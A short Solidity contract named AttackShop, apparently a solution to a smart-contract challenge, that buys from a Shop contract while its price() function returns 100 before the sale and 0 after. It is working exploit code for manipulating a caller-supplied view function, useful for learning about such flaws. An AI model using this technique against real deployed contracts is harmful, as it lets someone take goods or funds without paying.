// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract AttackShop {
    Shop public shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function attack() public {
        shop.buy();
    }

    function price() public view returns (uint256) {
        if (!shop.isSold()) {
            return 100;
        } else {
            return 0;
        }
    }
}
